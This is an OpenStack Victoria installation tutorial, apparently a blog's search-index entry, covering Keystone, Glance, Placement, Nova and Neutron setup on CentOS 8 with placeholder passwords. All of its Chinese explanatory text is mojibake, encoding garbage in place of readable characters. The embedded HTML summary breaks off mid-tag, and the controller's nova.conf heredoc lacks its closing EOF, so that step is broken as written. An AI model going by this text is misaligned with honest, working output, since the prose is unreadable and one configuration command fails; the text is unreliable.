å¦‚ä¸‹ä¿¡æ¯\nServerName controller åˆ›å»ºè½¯é“¾æ¥\nln -s /usr/share/keystone/wsgi-keystone.conf /etc/httpd/conf.d/ å¯åŠ¨httpdæœåŠ¡ å¹¶è®¾ç½®å¼€æœºè‡ªå¯\nsystemctl start httpd \u0026amp;\u0026amp; systemctl enable httpd åˆ›å»ºç¯å¢ƒå˜é‡è„šæœ¬\ncat \u0026gt; admin-openrc \u0026lt;\u0026lt;EOF export OS_USERNAME=admin export OS_PASSWORD=ADMIN_PASS export OS_PROJECT_NAME=admin export OS_USER_DOMAIN_NAME=Default export OS_PROJECT_DOMAIN_NAME=Default export OS_AUTH_URL=http://controller:5000/v3 export OS_IDENTITY_API_VERSION=3 export OS_IMAGE_API_VERSION=2 EOF æ‰§è¡Œå‘½ä»¤ source admin-openrc æˆ–è€… . admin-openrc ä½¿ç¯å¢ƒå˜é‡ç”Ÿæ•ˆã€‚\nåˆ›å»ºåŸŸã€é¡¹ç›®ã€ç”¨æˆ·å’Œè§’è‰² åˆ›å»ºåŸŸï¼Œç¨‹åºä¸­å·²å­˜åœ¨é»˜è®¤åŸŸï¼Œæ­¤å‘½ä»¤åªæ˜¯ä¸€ä¸ªåˆ›å»ºåŸŸçš„ä¾‹å­ï¼Œå¯ä»¥ä¸æ‰§è¡Œ\nopenstack domain create --description \u0026#34;An Example Domain\u0026#34; example åˆ›å»ºserviceé¡¹ç›®ï¼Œä¹Ÿå«åšç§Ÿæˆ·\nopenstack project create --domain default --description \u0026#34;Service Project\u0026#34; service éªŒè¯tokenä»¤ç‰Œ\nopenstack token issue å®‰è£…GlanceæœåŠ¡ åˆ›å»ºæ•°æ®åº“ è¿æ¥æ•°æ®åº“\nmysql -u root -p åˆ›å»ºglanceæ•°æ®åº“\nCREATE DATABASE glance; æˆäºˆglanceæ•°æ®åº“æƒé™ï¼Œç„¶åé€€å‡º\nGRANT ALL PRIVILEGES ON glance.* TO \u0026#39;glance\u0026#39;@\u0026#39;localhost\u0026#39; IDENTIFIED BY \u0026#39;GLANCE_DBPASS\u0026#39;; GRANT ALL PRIVILEGES ON glance.* TO \u0026#39;glance\u0026#39;@\u0026#39;%\u0026#39; IDENTIFIED BY \u0026#39;GLANCE_DBPASS\u0026#39;; exit; åˆ›å»ºglanceç”¨æˆ·å¹¶å…³è”è§’è‰² åˆ›å»ºglanceç”¨æˆ·å¹¶è®¾ç½®å¯†ç ä¸ºGLANCE_PASSï¼Œæ­¤å¤„ä¸ä¸Šé¢åˆ›å»ºç”¨æˆ·çš„ä¸åŒä¹‹å¤„æ˜¯æœªä½¿ç”¨äº¤äº’å¼çš„æ–¹å¼ï¼Œç›´æ¥å°†å¯†ç æ”¾å…¥äº†å‘½ä»¤ä¸­\nopenstack user create --domain default --password GLANCE_PASS glance ä½¿ç”¨adminè§’è‰²å°†Glanceç”¨æˆ·æ·»åŠ åˆ°æœåŠ¡é¡¹ç›®ä¸­\n# åœ¨serviceçš„é¡¹ç›®ä¸Šç»™glanceç”¨æˆ·å…³è”adminè§’è‰² openstack role add --project service --user glance admin åˆ›å»ºglanceæœåŠ¡å¹¶æ³¨å†ŒAPI åˆ›å»ºglanceæœåŠ¡\nopenstack service create --name glance --description \u0026#34;OpenStack Image\u0026#34; image æ³¨å†ŒAPIï¼Œä¹Ÿå°±æ˜¯åˆ›å»ºé•œåƒæœåŠ¡çš„APIç»ˆç«¯endpoints\nopenstack endpoint create --region RegionOne image public http://controller:9292 openstack endpoint create --region RegionOne image internal http://controller:9292 openstack endpoint create --region RegionOne image admin http://controller:9292 å®‰è£…å¹¶é…ç½®glance å®‰è£…è½¯ä»¶åŒ…\ndnf install openstack-glance -y ä¿®æ”¹é…ç½®æ–‡ä»¶\ncat \u0026gt; /etc/glance/glance-api.conf\u0026lt;\u0026lt;EOF [database] connection = mysql+pymysql://glance:GLANCE_DBPASS@controller/glance [keystone_authtoken] www_authenticate_uri = http://controller:5000 auth_url = http://controller:5000 memcached_servers = controller:11211 auth_type = password project_domain_name = Default user_domain_name = Default project_name = service username = glance password = GLANCE_PASS [paste_deploy] flavor = keystone [glance_store] stores = file,http default_store = file filesystem_store_datadir = /var/lib/glance/images/ EOF åŒæ­¥æ•°æ®åº“\nsu -s /bin/sh -c \u0026#34;glance-manage db_sync\u0026#34; glance å¯åŠ¨glanceæœåŠ¡å¹¶è®¾ç½®å¼€æœºè‡ªå¯\nsystemctl start openstack-glance-api \u0026amp;\u0026amp; systemctl enable openstack-glance-api å®‰è£…PlacementæœåŠ¡ åˆ›å»ºæ•°æ®åº“ è¿æ¥æ•°æ®åº“\nmysql -u root -p åˆ›å»ºPlancementæ•°æ®åº“\nCREATE DATABASE placement; æˆäºˆPlancementæ•°æ®åº“æƒé™ï¼Œç„¶åé€€å‡º\nGRANT ALL PRIVILEGES ON placement.* TO \u0026#39;placement\u0026#39;@\u0026#39;localhost\u0026#39; IDENTIFIED BY \u0026#39;PLACEMENT_DBPASS\u0026#39;; GRANT ALL PRIVILEGES ON placement.* TO \u0026#39;placement\u0026#39;@\u0026#39;%\u0026#39; IDENTIFIED BY \u0026#39;PLACEMENT_DBPASS\u0026#39;; exit; é…ç½®ç”¨æˆ·å’ŒEndpoint åˆ›å»ºä¸€ä¸ªplancementç”¨æˆ·å¹¶è®¾ç½®å¯†ç ä¸ºPLACEMENT_PASS\nopenstack user create --domain default --password PLACEMENT_PASS placement ä½¿ç”¨adminè§’è‰²å°†Placementç”¨æˆ·æ·»åŠ åˆ°æœåŠ¡é¡¹ç›®ä¸­\n# åœ¨serviceçš„é¡¹ç›®ä¸Šç»™placementç”¨æˆ·å…³è”adminè§’è‰² openstack role add --project service --user placement admin åˆ›å»ºPlacementæœåŠ¡å¹¶æ³¨å†ŒAPI åˆ›å»ºPlancementæœåŠ¡\nopenstack service create --name placement --description \u0026#34;Placement API\u0026#34; placement åˆ›å»ºPlancementæœåŠ¡APIç«¯å£\nopenstack endpoint create --region RegionOne placement public http://controller:8778 openstack endpoint create --region RegionOne placement internal http://controller:8778 openstack endpoint create --region RegionOne placement admin http://controller:8778 å®‰è£…PlacementæœåŠ¡ å®‰è£…Plancementè½¯ä»¶åŒ…\nyum install openstack-placement-api -y ä¿®æ”¹é…ç½®æ–‡ä»¶\ncat \u0026gt; /etc/placement/placement.conf \u0026lt;\u0026lt;EOF [placement_database] connection = mysql+pymysql://placement:PLACEMENT_DBPASS@controller/placement [api] auth_strategy = keystone [keystone_authtoken] auth_url = http://controller:5000/v3 memcached_servers = controller:11211 auth_type = password project_domain_name = Default user_domain_name = Default project_name = service username = placement password = PLACEMENT_PASS EOF åŒæ­¥æ•°æ®åº“\nsu -s /bin/sh -c \u0026#34;placement-manage db sync\u0026#34; placement é‡å¯httpdæœåŠ¡\nsystemctl restart httpd æ£€æŸ¥PlacementæœåŠ¡çŠ¶æ€\nplacement-status upgrade check å®‰è£…NovaæœåŠ¡ åˆ›å»ºæ•°æ®åº“ è¿æ¥æ•°æ®åº“\nmysql -u root -p åˆ›å»ºnova_apiï¼Œnovaå’Œnova_cell0æ•°æ®åº“\nCREATE DATABASE nova_api; CREATE DATABASE nova; CREATE DATABASE nova_cell0; åˆ†åˆ«æˆäºˆä¸‰ä¸ªæ•°æ®åº“æƒé™ï¼Œç„¶åé€€å‡º\n# æˆæƒnova_apiæ•°æ®åº“ GRANT ALL PRIVILEGES ON nova_api.* TO \u0026#39;nova\u0026#39;@\u0026#39;localhost\u0026#39; IDENTIFIED BY \u0026#39;NOVA_DBPASS\u0026#39;; GRANT ALL PRIVILEGES ON nova_api.* TO \u0026#39;nova\u0026#39;@\u0026#39;%\u0026#39; IDENTIFIED BY \u0026#39;NOVA_DBPASS\u0026#39;; # æˆæƒnovaæ•°æ®åº“ GRANT ALL PRIVILEGES ON nova.* TO \u0026#39;nova\u0026#39;@\u0026#39;localhost\u0026#39; IDENTIFIED BY \u0026#39;NOVA_DBPASS\u0026#39;; GRANT ALL PRIVILEGES ON nova.* TO \u0026#39;nova\u0026#39;@\u0026#39;%\u0026#39; IDENTIFIED BY \u0026#39;NOVA_DBPASS\u0026#39;; # æˆæƒnova_cell0æ•°æ®åº“ GRANT ALL PRIVILEGES ON nova_cell0.* TO \u0026#39;nova\u0026#39;@\u0026#39;localhost\u0026#39; IDENTIFIED BY \u0026#39;NOVA_DBPASS\u0026#39;; GRANT ALL PRIVILEGES ON nova_cell0.* TO \u0026#39;nova\u0026#39;@\u0026#39;%\u0026#39; IDENTIFIED BY \u0026#39;NOVA_DBPASS\u0026#39;; exit; é…ç½®ç”¨æˆ·å’ŒEndpoint åˆ›å»ºnovaç”¨æˆ·å¹¶è®¾ç½®å¯†ç ä¸ºNOVA_PASS\nopenstack user create --domain default --password NOVA_PASS nova ä½¿ç”¨adminè§’è‰²å°†novaç”¨æˆ·æ·»åŠ åˆ°æœåŠ¡é¡¹ç›®ä¸­\n# åœ¨serviceçš„é¡¹ç›®ä¸Šç»™novaç”¨æˆ·å…³è”adminè§’è‰² openstack role add --project service --user nova admin åˆ›å»ºNovaæœåŠ¡å¹¶æ³¨å†ŒAPI åˆ›å»ºNovaæœåŠ¡\nopenstack service create --name nova --description \u0026#34;OpenStack Compute\u0026#34; compute åˆ›å»ºNovaæœåŠ¡APIç«¯å£\nopenstack endpoint create --region RegionOne compute public http://controller:8774/v2.1 openstack endpoint create --region RegionOne compute internal http://controller:8774/v2.1 openstack endpoint create --region RegionOne compute admin http://controller:8774/v2.1 å®‰è£…å¹¶é…ç½®Nova å®‰è£…novaç›¸å…³è½¯ä»¶åŒ…\nyum install openstack-nova-api openstack-nova-conductor openstack-nova-novncproxy openstack-nova-scheduler -y ä¿®æ”¹é…ç½®æ–‡ä»¶\ncat \u0026gt; /etc/nova/nova.conf \u0026lt;\u0026lt;EOF [DEFAULT] enabled_apis = osapi_compute,metadata transport_url = rabbit://openstack:RABBIT_PASS@controller:5672/ my_ip = 172.16.10.100 [api_database] connection = mysql+pymysql://nova:NOVA_DBPASS@controller/nova_api [database] connection = mysql+pymysql://nova:NOVA_DBPASS@controller/nova [api] auth_strategy = keystone [keystone_authtoken] www_authenticate_uri = http://controller:5000/ auth_url = http://controller:5000/ memcached_servers = controller:11211 auth_type = password project_domain_name = Default user_domain_name = Default project_name = service username = nova password = NOVA_PASS [vnc] enabled = true server_listen = $my_ip server_proxyclient_address = $my_ip [glance] api_servers = http://controller:9292 [oslo_concurrency] lock_path = /var/lib/nova/tmp [placement] region_name = RegionOne project_domain_name = Default project_name = service auth_type = password user_domain_name = Default auth_url = http://controller:5000/v3 username = placement password = PLACEMENT_PASS åŒæ­¥æ•°æ®åº“\n# åŒæ­¥nova_apiæ•°æ®åº“ su -s /bin/sh -c \u0026#34;nova-manage api_db sync\u0026#34; nova # åŒæ­¥nova_cell0æ•°æ®åº“ su -s /bin/sh -c \u0026#34;nova-manage cell_v2 map_cell0\u0026#34; nova # åˆ›å»ºcell1 su -s /bin/sh -c \u0026#34;nova-manage cell_v2 create_cell --name=cell1 --verbose\u0026#34; nova # åŒæ­¥novaæ•°æ®åº“ su -s /bin/sh -c \u0026#34;nova-manage db sync\u0026#34; nova éªŒè¯nova_cell0å’Œcell1æ˜¯å¦æ·»åŠ æˆåŠŸ\nsu -s /bin/sh -c \u0026#34;nova-manage cell_v2 list_cells\u0026#34; nova å¯åŠ¨æœåŠ¡å¹¶è®¾ä¸ºå¼€æœºè‡ªå¯\nsystemctl enable openstack-nova-api openstack-nova-scheduler openstack-nova-conductor openstack-nova-novncproxy systemctl start openstack-nova-api openstack-nova-scheduler openstack-nova-conductor openstack-nova-novncproxy ä½¿ç”¨å‘½ä»¤nova service-listéªŒè¯æœåŠ¡æ˜¯å¦å¯åŠ¨æˆåŠŸ\nå®‰è£…neutronæœåŠ¡ åˆ›å»ºæ•°æ®åº“ è¿æ¥æ•°æ®åº“\nmysql -u root -p åˆ›å»ºneutronæ•°æ®åº“\nCREATE DATABASE neutron; æˆäºˆæ•°æ®åº“æƒé™ï¼Œç„¶åé€€å‡º\nGRANT ALL PRIVILEGES ON neutron.* TO \u0026#39;neutron\u0026#39;@\u0026#39;localhost\u0026#39; IDENTIFIED BY \u0026#39;NEUTRON_DBPASS\u0026#39;; GRANT ALL PRIVILEGES ON neutron.* TO \u0026#39;neutron\u0026#39;@\u0026#39;%\u0026#39; IDENTIFIED BY \u0026#39;NEUTRON_DBPASS\u0026#39;; exit; é…ç½®ç”¨æˆ·å’ŒEndpoint åˆ›å»ºneutronç”¨æˆ·å¹¶è®¾ç½®å¯†ç ä¸ºNEUTRON_PASS\nopenstack user create --domain default --password NEUTRON_PASS neutron ä½¿ç”¨adminè§’è‰²å°†neutronç”¨æˆ·æ·»åŠ åˆ°æœåŠ¡é¡¹ç›®ä¸­\n# åœ¨serviceçš„é¡¹ç›®ä¸Šç»™neutronç”¨æˆ·å…³è”adminè§’è‰² openstack role add --project service --user neutron admin åˆ›å»ºNeutronæœåŠ¡å¹¶æ³¨å†ŒAPI åˆ›å»ºNeutronæœåŠ¡\nopenstack service create --name neutron --description \u0026#34;OpenStack Networking\u0026#34; network åˆ›å»ºNeutronæœåŠ¡APIç«¯å£\nopenstack endpoint create --region RegionOne network public http://controller:9696 openstack endpoint create --region RegionOne network internal http://controller:9696 openstack endpoint create --region RegionOne network admin http://controller:9696 å®‰è£…å¹¶é…ç½®neutronæœåŠ¡ å®‰è£…neutronç›¸å…³è½¯ä»¶åŒ…\nyum install openstack-neutron openstack-neutron-ml2 openstack-neutron-openvswitch python-neutronclient openstack-neutron-fwaas -y ä¿®æ”¹é…ç½®æ–‡ä»¶\ncat \u0026gt; /etc/neutron/neutron.conf \u0026lt;\u0026lt;EOF [database] connection = mysql+pymysql://neutron:NEUTRON_DBPASS@controller/neutron [DEFAULT] core_plugin = ml2 service_plugins = transport_url = rabbit://openstack:RABBIT_PASS@controller auth_strategy = keystone notify_nova_on_port_status_changes = true notify_nova_on_port_data_changes = true [keystone_authtoken] www_authenticate_uri = http://controller:5000 auth_url = http://controller:5000 memcached_servers = controller:11211 auth_type = password project_domain_name = default user_domain_name = default project_name = service username = neutron password = NEUTRON_PASS [nova] auth_url = http://controller:5000 auth_type = password project_domain_name = default user_domain_name = default region_name = RegionOne project_name = service username = nova password = NOVA_PASS [oslo_concurrency] lock_path = /var/lib/neutron/tmp EOF é…ç½®ML2ç»„ä»¶\ncat \u0026gt; /etc/neutron/plugins/ml2/ml2_conf.ini \u0026lt;\u0026lt;EOF [ml2] type_drivers = flat,vlan tenant_network_types = vlan mechanism_drivers = openvswitch debug=True [ml2_type_flat] [ml2_type_vlan] network_vlan_ranges =physnet1:1000:1999,physnet2 [ml2_type_vxlan] [securitygroup] enable_security_group = True enable_ipset = True firewall_driver = neutron.agent.linux.iptables_firewall.OVSHybridIptablesFirewallDriver [ovs] tenant_network_type = vlan bridge_mappings = physnet1:br-vlan,physnet2:br-ex EOF é…ç½®L3ä»£ç†å•†\ncat\u0026gt; /etc/neutron/l3_agent.ini\u0026lt;\u0026lt;EOF [DEFAULT] interface_driver = neutron.agent.linux.interface.OVSInterfaceDriver router_delete_namespaces = True external_network_bridge = verbose = True [fwaas] driver=neutron_fwaas.services.firewall.drivers.linux.iptables_fwaas.IptablesFwaasDriver enabled = True [agent] extensions = fwaas [ovs] EOF é…ç½®DHCPä»£ç†å•†\ncat\u0026gt;/etc/neutron/dhcp_agent.ini\u0026lt;\u0026lt;EOF [DEFAULT] debug=True interface_driver = neutron.agent.linux.interface.OVSInterfaceDriver dhcp_driver = neutron.agent.linux.dhcp.Dnsmasq enable_isolated_metadata = True dnsmasq_config_file = /etc/neutron/dnsmasq-neutron.conf EOF echo \u0026#34;dhcp-option-force=26,1454\u0026#34; \u0026gt;/etc/neutron/dnsmasq-neutron.conf é…ç½®metadataä»£ç†å™¨\ncat\u0026gt; /etc/neutron/metadata_agent.ini \u0026lt;\u0026lt;EOF [DEFAULT] nova_metadata_host = controller metadata_proxy_shared_secret = METADATA_SECRET memcache_servers = controller:11211 EOF é…ç½®OVSç»„ä»¶\ncat \u0026gt; /etc/neutron/plugins/ml2/openvswitch_agent.ini \u0026lt;\u0026lt;EOF [DEFAULT] [agent] [ovs] bridge_mappings = physnet1:br-vlan,physnet2:br-ex [securitygroup] firewall_driver=neutron.agent.linux.iptables_firewall.OVSHybridIptablesFirewallDriver enable_security_group=true [xenapi] EOF é…ç½®OVSäº¤æ¢æœº\nsystemctl enable openvswitch.service --now systemctl status openvswitch.service # ç”¨äºè”é€šè™šæ‹Ÿæœºçš„ç½‘æ¡¥ ovs-vsctl add-br br-vlan ovs-vsctl add-port br-vlan eth1 # ç”¨äºè”é€šå¤–éƒ¨ç½‘ç»œçš„ç½‘æ¡¥ ovs-vsctl add-br br-ex ovs-vsctl add-port br-ex eth2 é…ç½®è½¯é“¾æ¥\nln -s /etc/neutron/plugins/ml2/ml2_conf.ini /etc/neutron/plugin.ini å¯åŠ¨ç›¸å…³æœåŠ¡\nsystemctl enable neutron-openvswitch-agent neutron-l3-agent neutron-dhcp-agent neutron-metadata-agent neutron-ovs-cleanup openvswitch systemctl start neutron-openvswitch-agent neutron-l3-agent neutron-dhcp-agent neutron-metadata-agent openvswitch systemctl status neutron-openvswitch-agent neutron-l3-agent neutron-dhcp-agent neutron-metadata-agent openvswitch æµ‹è¯•\n. admin-openrc openstack network agent list åˆ›å»ºæä¾›å•†ç½‘ç»œï¼ˆå¤–éƒ¨ç½‘ç»œï¼‰\nprovider-physical-networkè¡¨ç¤ºä½¿ç”¨çš„ç‰©ç†ç½‘ç»œï¼Œä¸ç½‘ç»œèŠ‚ç‚¹/etc/neutron/plugin.iniä¸­çš„é…ç½®ä¸€è‡´ã€‚\n. admin-openrc # æ·»åŠ é»˜è®¤çš„ç«¯å£å®‰å…¨ç»„è§„åˆ™ openstack security group rule create --proto icmp default openstack security group rule create --proto tcp --dst-port 22 default openstack security group rule create --proto tcp --dst-port 3389 default openstack security group rule create --proto tcp --dst-port 80 default openstack security group rule create --proto tcp --dst-port 443 default openstack security group rule create --proto tcp --dst-port 123 default openstack security group rule create --proto tcp --dst-port 53 default openstack security group rule create --proto udp --dst-port 123 default openstack security group rule create --proto udp --dst-port 53 default openstack network create --share --external \\ --provider-physical-network physnet2 \\ --provider-network-type flat provider # å­ç½‘éœ€è¦ä¸çœŸå®ç¯å¢ƒä¸€è‡´ openstack subnet create --network provider \\ --allocation-pool start=192.168.68.10,end=192.168.68.250 \\ --dns-nameserver 1.2.4.8 --gateway 192.168.68.1 \\ --subnet-range 192.168.68.0/24 provider è®¡ç®—èŠ‚ç‚¹ å®‰è£…novaç»„ä»¶ å®‰è£…è½¯ä»¶åŒ…\nyum install openstack-nova-compute -y ä¿®æ”¹é…ç½®æ–‡ä»¶\néœ€æ‰‹åŠ¨ä¿®æ”¹vncä¸‹çš„novncproxy_base_url\ncat \u0026gt; /etc/nova/nova.conf \u0026lt;\u0026lt;EOF [DEFAULT] enabled_apis = osapi_compute,metadata transport_url = rabbit://openstack:RABBIT_PASS@controller my_ip = 172.16.10.101 [api] auth_strategy = keystone [keystone_authtoken] www_authenticate_uri = http://controller:5000/ auth_url = http://controller:5000/ memcached_servers = controller:11211 auth_type = password project_domain_name = Default user_domain_name = Default project_name = service username = nova password = NOVA_PASS [neutron] auth_url = http://controller:5000 auth_type = password project_domain_name = default user_domain_name = default region_name = RegionOne project_name = service username = neutron password = NEUTRON_PASS service_metadata_proxy = true metadata_proxy_shared_secret = METADATA_SECRET [vnc] enabled = true server_listen = 0.0.0.0 server_proxyclient_address = $my_ip novncproxy_base_url = http://172.16.10.100:6080/vnc_auto.html [glance] api_servers = http://controller:9292 [oslo_concurrency] lock_path = /var/lib/nova/tmp [placement] region_name = RegionOne project_domain_name = Default project_name = service auth_type = password user_domain_name = Default auth_url = http://controller:5000/v3 username = placement password = PLACEMENT_PASS [libvirt] virt_type=qemu EOF å¯åŠ¨æœåŠ¡\nsystemctl enable libvirtd.service openstack-nova-compute.service --now systemctl status libvirtd.service openstack-nova-compute.service æ§åˆ¶ç«¯éªŒè¯novaèŠ‚ç‚¹ä¿¡æ¯\n. admin-openrc su -s /bin/sh -c \u0026#34;nova-manage cell_v2 discover_hosts --verbose\u0026#34; nova openstack hypervisor list openstack compute service list openstack catalog list nova-status upgrade check å®‰è£…neutronç»„ä»¶ å®‰è£…è½¯ä»¶åŒ…\nyum install -y openstack-neutron openstack-neutron-ml2 openstack-neutron-openvswitch ä¿®æ”¹é…ç½®æ–‡ä»¶\ncat \u0026gt; /etc/neutron/neutron.conf \u0026lt;\u0026lt;EOF [DEFAULT] transport_url = rabbit://openstack:RABBIT_PASS@controller auth_strategy = keystone [keystone_authtoken] www_authenticate_uri = http://controller:5000 auth_url = http://controller:5000 memcached_servers = controller:11211 auth_type = password project_domain_name = default user_domain_name = default project_name = service username = neutron password = NEUTRON_PASS [oslo_concurrency] lock_path = /var/lib/neutron/tmp EOF é…ç½®OVSç½‘æ¡¥\nsystemctl enable openvswitch --now systemctl status openvswitch ovs-vsctl add-br br-vlan ovs-vsctl add-port br-vlan eth1 é…ç½®neutron ovsç»„ä»¶\ncat\u0026gt;/etc/neutron/plugins/ml2/openvswitch_agent.ini\u0026lt;\u0026lt;EOF [DEFAULT] [agent] [ovs] bridge_mappings = physnet1:br-vlan [securitygroup] firewall_driver=neutron.agent.linux.iptables_firewall.OVSHybridIptablesFirewallDriver enable_security_group=True [xenapi] EOF å¯åŠ¨æœåŠ¡\n# é‡å¯nova-compute systemctl restart openstack-nova-compute systemctl enable neutron-openvswitch-agent --now systemctl status neutron-openvswitch-agent è®¿é—®dashboard ä½¿ç”¨æµè§ˆå™¨è®¿é—® http://172.16.10.100/dashboardï¼Œä½¿ç”¨admin/ADMIN_PASSç™»å½•ç³»ç»Ÿã€‚\n","permalink":"https://www.typesafe.cn/posts/install-openstack-victoria/","summary":"\u003cp\u003eè¿‘æœŸå…¬å¸ä¸šåŠ¡éœ€æ±‚ï¼Œéœ€è¦å®‰è£…ä¸€å¥—Openstackç¯å¢ƒå­¦ä¹ ï¼Œçœ‹äº†ä¸€ä¸‹ç°åœ¨å·²ç»å‡ºäº†\u003ccode\u003ewallaby\u003c/code\u003eç‰ˆäº†ï¼Œæˆ‘æœæ–­é€‰æ‹©äº†ä¸Šä¸€ä¸ªç‰ˆæœ¬\u003ccode\u003evictoria\u003c/code\u003eã€‚å› ä¸ºæ²¡æœ‰è¶³å¤Ÿå¤šçš„ç‰©ç†æœåŠ¡å™¨äº†ï¼Œåªå¥½æ‰¾äº†ä¸€å°64æ ¸256Gå†…å­˜6Tç¡¬ç›˜çš„æœºå™¨æ¥åˆ›å»ºå‡ å°è™šæ‹Ÿæœºæ¥æ­ç¯å¢ƒäº†ã€‚\u003c/p\u003e\n\u003ch1 id=\"å®éªŒç¯å¢ƒ\"\u003eå®éªŒç¯å¢ƒ\u003c/h1\u003e\n\u003cp\u003eæ­¤æ¬¡å®éªŒä½¿ç”¨åˆ°äº†ä¸‰å°è™šæ‹Ÿæœºï¼Œéƒ½æ˜¯ä½¿ç”¨centos8ç³»ç»Ÿï¼Œä¸€å°æœºå™¨å½“ä½œæ§åˆ¶å’Œç½‘ç»œèŠ‚ç‚¹ï¼Œå¦å¤–ä¸¤å°å½“ä½œè®¡ç®—èŠ‚ç‚¹ï¼Œä½¿ç”¨OVS+VLANçš„ç½‘ç»œæ¨¡å¼ï¼Œeth0ä½œä¸ºç®¡ç†ç½‘ç»œï¼Œeth1äº’ç›¸è¿æ¥åˆ°OVSç½‘æ¡¥ä¸Šæ¨¡æ‹Ÿtrunkç½‘å¡ï¼Œcontrollerå¤šå¢åŠ ä¸€ä¸ªeth2ç”¨äºè®¿é—®å¤–éƒ¨ç½‘ç»œã€‚\u003c/p\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003eèŠ‚ç‚¹\u003c/th\u003e\n          \u003cth\u003eä½œç”¨\u003c/th\u003e\n          \u003cth\u003eeth0\u003c/th\u003e\n          \u003cth\u003eeth1\u003c/th\u003e\n          \u003cth\u003eeth2\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003econtroller\u003c/td\u003e\n          \u003ctd\u003eæ§åˆ¶èŠ‚ç‚¹ã€ç½‘ç»œèŠ‚ç‚¹\u003c/td\u003e\n          \u003ctd\u003e172.16.10.100\u003c/td\u003e\n          \u003ctd\u003eæ— IP\u003c/td\u003e\n          \u003ctd\u003eæ¡¥æ¥ï¼Œæ— IP\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ecompute-101\u003c/td\u003e\n          \u003ctd\u003eè®¡ç®—èŠ‚ç‚¹\u003c/td\u003e\n          \u003ctd\u003e172.16.10.101\u003c/td\u003e\n          \u003ctd\u003eæ— IP\u003c/td\u003e\n          \u003ctd\u003eâŒ\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ecompute-102\u003c/td\u003e\n          \u003ctd\u003eè®¡ç®—èŠ‚ç‚¹\u003c/td\u003e\n          \u003ctd\u003e172.16.10.102\u003c/td\u003e\n          \u003ctd\u003eæ— IP\u003c/td\u003e\n          \u003ctd\u003eâŒ\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch1 id=\"å®‰è£…è™šæ‹Ÿæœº\"\u003eå®‰è£…è™šæ‹Ÿæœº\u003c/h1\u003e\n\u003ch2 id=\"å®‰è£…ä¾èµ–\"\u003eå®‰è£…ä¾èµ–\u003c/h2\u003e\n\u003cp\u003eå®‰è£…KVMå’ŒLinuxç½‘æ¡¥\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eyum install -y qemu-kvm libvirt virt-install bridge-utils virt-manager dejavu-lgc-sans-fonts\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cblockquote\u003e\n\u003cp\u003e\u003ccode\u003edejavu-lgc-sans-fonts\u003c/code\u003eç”¨äºè§£å†³ \u003ccode\u003evirt-manaer\u003c/code\u003e ä¹±ç \u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003eå¯åŠ¨\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esystemctl enable libvirtd \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e systemctl start libvirtd\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå®‰è£…OVS\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eyum install openvswitch\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå¯åŠ¨OVS\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esystemctl enable openvswitch \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e systemctl start openvswitch\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"åˆ›å»ºè™šæ‹Ÿæœº\"\u003eåˆ›å»ºè™šæ‹Ÿæœº\u003c/h3\u003e\n\u003cp\u003eä½¿ç”¨ virt-manager åˆ›å»ºä¸‰å°è™šæ‹Ÿæœº\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20210604140054913\" loading=\"lazy\" src=\"https://oss.typesafe.cn/vm-nodes.png\"\u003e\u003c/p\u003e\n\u003ch3 id=\"é…ç½®ç½‘ç»œ\"\u003eé…ç½®ç½‘ç»œ\u003c/h3\u003e\n\u003ch4 id=\"é…ç½®ç®¡ç†ç½‘å¡\"\u003eé…ç½®ç®¡ç†ç½‘å¡\u003c/h4\u003e\n\u003cp\u003eç»™è™šæ‹Ÿæœºé…ç½®æ¡¥æ¥ç½‘ç»œï¼Œå‚è€ƒ\u003ca href=\"https://typesafe.cn/posts/linux-kvm/\"\u003eLinuxè™šæ‹ŸåŒ–æŠ€æœ¯KVM\u003c/a\u003eï¼Œæ•ˆæœå¦‚å›¾\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://oss.typesafe.cn/vm-manage-port-config.png\"\u003e\u003c/p\u003e\n\u003ch4 